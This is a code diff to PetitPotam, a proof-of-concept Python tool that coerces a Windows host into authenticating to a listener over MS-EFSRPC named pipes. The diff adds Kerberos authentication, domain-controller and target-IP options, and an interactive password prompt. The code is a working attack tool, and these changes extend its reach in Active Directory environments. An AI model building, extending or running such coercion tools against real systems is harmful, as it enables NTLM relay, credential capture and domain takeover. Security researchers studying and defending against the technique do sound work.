@@ -81,7 +81,7 @@ OPNUMS = {
 }
  
 class CoerceAuth():
-    def connect(self, username, password, domain, lmhash, nthash, target, pipe):
+    def connect(self, username, password, domain, lmhash, nthash, target, pipe, doKerberos, dcHost, targetIp):
         binding_params = {
             'lsarpc': {
                 'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]' % target,
@@ -107,6 +107,12 @@ class CoerceAuth():
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
         if hasattr(rpctransport, 'set_credentials'):
             rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
+
+        if doKerberos:
+            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
+        if targetIp:
+            rpctransport.setRemoteHost(targetIp)
+
         dce = rpctransport.get_dce_rpc()
         #dce.set_auth_type(RPC_C_AUTHN_WINNT)
         #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
@@ -147,9 +153,20 @@ class CoerceAuth():
 def main():
     parser = argparse.ArgumentParser(add_help = True, description = "PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()")
     parser.add_argument('-u', '--username', action="store", default='', help='valid username')
-    parser.add_argument('-p', '--password', action="store", default='', help='valid password')
+    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
     parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
     parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
+
+    parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
+    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+                        '(KRB5CCNAME) based on target parameters. If valid credentials '
+                        'cannot be found, it will use the ones specified in the command '
+                        'line')
+    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
+    parser.add_argument('-target-ip', action='store', metavar="ip address",
+                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
+                        'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')
+
     parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass'], default='lsarpc', help='Named pipe to use (default: lsarpc)')
     parser.add_argument('listener', help='ip address or hostname of listener')
     parser.add_argument('target', help='ip address or hostname of target')
@@ -162,9 +179,13 @@ def main():
         nthash = ''
 
     print(show_banner)
+
+    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
+        from getpass import getpass
+        options.password = getpass("Password:")
     
     plop = CoerceAuth()
-    dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=options.pipe)
+    dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=options.pipe, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)
     plop.EfsRpcOpenFileRaw(dce, options.listener)
 
     dce.disconnect()
